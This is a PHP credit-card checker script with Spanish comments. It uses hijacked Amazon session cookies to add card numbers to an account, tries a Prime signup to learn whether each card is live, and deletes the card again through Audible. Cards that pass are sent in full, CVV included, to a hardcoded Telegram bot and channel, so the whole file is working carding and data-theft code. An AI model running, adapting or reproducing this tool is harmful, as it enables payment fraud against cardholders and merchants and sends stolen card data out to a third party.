<?php
error_reporting(0);

// --- CONFIGURACIÓN DEL SCRAPPER ---
$token_telegram = "8611373580:AAGdBiDVp5qK-WBmlrzVf2oKge2-HuvRS_U"; // Pon aquí tu token
$chat_id_telegram = "-1003778786216"; // Pon aquí tu ID de canal (-100...)

function enviarTelegram($mensaje, $token, $chat_id) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&parse_mode=Markdown&text=" . urlencode($mensaje);
    file_get_contents($url);
}

function getstr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getstr2($string, $start, $end, $line = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$line]);
    return $str[0];
}

function multiexplode($delimiters, $string){
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista_input = str_replace(array(" "), '/', $_POST['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista_input);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista_matched)){
    die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista_input.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function gerarLetrasAleatorias($quantidade) {
    $letras = 'abcdefghijklmnopqrstuvwxyz';
    $tamanhoLetras = strlen($letras);
    $resultado = '';
    for ($i = 0; $i < $quantidade; $i++) {
        $indice = rand(0, $tamanhoLetras - 1);
        $resultado .= $letras[$indice];
    }
    return $resultado;
}

$letrasAleatorias = gerarLetrasAleatorias(5);
$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

$cookieprim = $_POST['cookies'];
if($cookieprim == null){
    die("¡Coloque las cookies de amazon.com en el formulario de guardar cookies!");    
}
$cookieprim = trim($cookieprim);

function convertCookie($text, $outputFormat = 'US'){
    $countryCodes = [
        'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
    ];
    $currentCountry = $countryCodes['US'];
    $text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
    $text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
    return $text;
}

$cookie2 = convertCookie($cookieprim, 'US');
$time = time();
$first_name = $letrasAleatorias;
$last_name = $letrasAleatorias;

// OBTENER CSRF
$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL=> 'https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
    CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_SSL_VERIFYPEER=>false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_ENCODING => "gzip",
    CURLOPT_HTTPHEADER => array(
        'Host: www.amazon.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    )
]);
$r = curl_exec($ch);
$csrf = getstr($r, 'csrfToken = "','"');
curl_close($ch);

if ($csrf == null) {
    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso, revalide sus cookies. </span> ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}

// AGREGAR TARJETA
$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
    CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_SSL_VERIFYPEER=>false,
    CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$first_name.'+'.$last_name.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded', 'X-Requested-With: com.amazon.dee.app')
]);
$r = curl_exec($ch);
$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');
curl_close($ch);

// FUNCIONES DE DIRECCIÓN
function adicionarEnderecoAmazon($cookie2, $first_name, $last_name){
    $randTel = rand(1111111,9999999);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_post',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIE => $cookie2,
        CURLOPT_POSTFIELDS => "address-ui-widgets-countryCode=US&address-ui-widgets-enterAddressFullName=$first_name+$last_name&address-ui-widgets-enterAddressPhoneNumber=313$randTel&address-ui-widgets-enterAddressLine1=Street+123&address-ui-widgets-enterAddressCity=Montgomery&address-ui-widgets-enterAddressStateOrRegion=AL&address-ui-widgets-enterAddressPostalCode=36104&address-ui-widgets-use-as-my-default=true",
        CURLOPT_HTTPHEADER => ['content-type: application/x-www-form-urlencoded'],
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function obtenerEnderecoAmazon($cookie2, $csrf) {
    $ch = curl_init(); 
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.amazon.com/hz/mycd/ajax',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIE => $cookie2,
        CURLOPT_POSTFIELDS => 'data=%7B%22param%22%3A%7B%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' . urlencode($csrf),
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    return getStr($r, 'AddressId":"','"');
}

$addresid = obtenerEnderecoAmazon($cookie2, $csrf);
if(empty($addresid)){
    adicionarEnderecoAmazon($cookie2, $first_name, $last_name);
    sleep(2); // <--- SLEEP 1 (Original)
    $addresid = obtenerEnderecoAmazon($cookie2, $csrf);
}

// SET ONE CLICK
$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
    CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
]);
$r = curl_exec($ch);
curl_close($ch);

// INTENTO DE SUSCRIPCIÓN PRIME
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://www.amazon.com/gp/prime/pipeline/membersignup",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_POSTFIELDS => "clientId=DiscoveryBar&ingressId=JoinPrimePill&ref=join_prime_cta_discobar&primeCampaignId=DiscoveryBar_JoinPrimePill_ATVHome&redirectURL=&inline=1&disableCSM=1",
]);
$Fim = curl_exec($ch);
curl_close($ch);

// CONSULTA DE BIN
$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

sleep(1); // <--- SLEEP 2 (Para que la limpieza no sea instantánea)

// ELIMINACIÓN EN AUDIBLE.COM (USA)
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.audible.com/account/payments?ref=',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_HTTPHEADER => array('Host: www.audible.com', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
]);
$r_aud = curl_exec($ch);
$csrf_audible = getstr($r_aud, 'data-csrf-token="', '"');
if (empty($csrf_audible)) {
    $c_temp = getstr($r_aud, 'data-payment-id="', 'payment-type');
    $csrf_audible = getstr($c_temp, 'data-csrf-token="', '"');
}
$address_audible = getstr($r_aud, 'data-billing-address-id="', '"');
curl_close($ch);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIE => $cookie2,
    CURLOPT_POSTFIELDS => "paymentId=".$cardid_puro."&billingAddressId=".$address_audible."&paymentType=CreditCard&tail=0433&accountHolderName=Teste&csrfToken=".urlencode($csrf_audible),
]);
$r_del = curl_exec($ch);
curl_close($ch);

if (strpos($r_del, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
    $msg = '✅';
    $err = "Eliminado: $msg";
} else {
    $msg = '❌';
    $err = "Eliminado: $msg";
}

// VARIABLE PARA EL SCRAPPER (FORMATO QUE PEDISTE)
$bin_corta = substr($cc, 0, 6);
$scrapp_msg = "⌞ Zhentio/ Scrapp⌝| #BIN($bin_corta)\n";
$scrapp_msg .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
$scrapp_msg .= "•| Card: `$cc|$mes|$ano|$cvv`\n";
$scrapp_msg .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
$scrapp_msg .= "⼥| Info: " . $infobin . "\n";
$scrapp_msg .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉";

// VEREDICTO FINAL (CON TUS IFS)
if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
enviarTelegram($scrapp_msg, $token_telegram, $chat_id_telegram);
die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {
enviarTelegram($scrapp_msg, $token_telegram, $chat_id_telegram);
die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}elseif (strpos($Fim, 'InvalidInput')) {
die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}elseif(strpos($Fim, 'If you would still like to join Prime you can sign up during checkout')) {
die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Límite de intentos. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
} else {
die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}
?>